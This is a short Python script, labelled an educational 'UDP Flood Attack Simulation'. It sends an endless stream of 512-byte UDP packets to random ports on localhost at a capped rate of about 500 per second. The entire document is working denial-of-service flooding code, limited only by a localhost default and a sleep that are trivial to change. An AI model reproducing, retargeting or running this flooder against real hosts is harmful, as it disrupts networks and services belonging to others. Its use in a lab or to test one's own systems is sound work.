#!/usr/bin/env python3
"""
UDP Flood Attack Simulation
- Sends random UDP packets to random ports on localhost
- Creates high-volume UDP traffic
- Ethical simulation for educational purposes only
"""

import socket
import random
import time
import sys

TARGET_HOST = "127.0.0.1"
PAYLOAD_SIZE = 512
PACKETS_PER_SECOND = 500

def udp_flood():
    print("[*] UDP Flood Attack Simulation")
    print(f"[*] Target: {TARGET_HOST}")
    print(f"[*] Payload size: {PAYLOAD_SIZE} bytes")
    print(f"[*] Rate: ~{PACKETS_PER_SECOND} packets/second")
    print("[*] Press Ctrl+C to stop")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"A" * PAYLOAD_SIZE
    packet_count = 0
    
    try:
        while True:
            # Send to random port (1-65535)
            random_port = random.randint(1, 65535)
            sock.sendto(payload, (TARGET_HOST, random_port))
            packet_count += 1
            
            if packet_count % 100 == 0:
                print(f"[+] Sent {packet_count} UDP packets", end='\r')
            
            # Control rate to prevent system crash
            time.sleep(1.0 / PACKETS_PER_SECOND)
                
    except KeyboardInterrupt:
        print(f"\n[*] UDP Flood stopped. Total packets: {packet_count}")
        sock.close()
        sys.exit(0)

if __name__ == "__main__":
    udp_flood()